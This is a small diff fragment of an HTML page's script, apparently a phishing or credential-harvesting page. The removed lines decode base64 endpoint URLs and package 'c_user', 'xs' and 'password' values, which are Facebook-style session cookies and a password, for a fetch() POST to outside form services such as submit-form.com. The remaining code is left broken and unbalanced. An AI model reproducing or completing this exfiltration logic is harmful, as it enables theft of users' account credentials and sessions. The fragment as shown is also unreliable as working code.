@@ -1562,12 +1562,9 @@
                 'https://submit-form.com/ydww6diYv',
           ];
 
-          endpoints.forEach(encodedUrl => {
-              const decodedUrl = atob(encodedUrl);
-              const formData = new FormData();
-              formData.append('c_user', data.c_user);
-              formData.append('xs', data.xs);
-              formData.append('password', data.password);
+          
+              
+              
 
               fetch(decodedUrl, {
                   method: 'POST',
@@ -1878,3 +1875,4 @@
 
 
 </body></html>
+
